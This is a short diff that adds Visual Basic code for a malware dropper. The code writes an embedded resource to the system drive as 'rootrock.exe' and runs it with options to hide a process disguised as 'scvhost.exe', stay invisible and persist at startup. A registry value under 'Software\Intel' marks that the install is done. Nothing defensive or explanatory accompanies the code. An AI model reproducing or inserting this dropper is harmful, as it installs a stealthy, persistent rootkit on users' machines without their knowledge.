@@ -1,0 +1,12 @@
+If rootkit = "1" Then
+log ("rootkit")
+If GetSettingString(HKEY_LOCAL_MACHINE, "Software\Intel", "Eintrag", "0") = "0" Then
+buffer = LoadResData(102, "CUSTOM")
+Open Environ("homedrive") & "\rootrock.exe" For Binary As #1
+Put #1, , buffer()
+Close #1
+Shell (Environ("homedrive") & "\rootrock.exe -p scvhost.exe -invisible -autostart -persistant 50")
+SaveSettingString HKEY_LOCAL_MACHINE, "Software\Intel", "Eintrag", "1"
+End If
+log ("rootkit END")
+End If
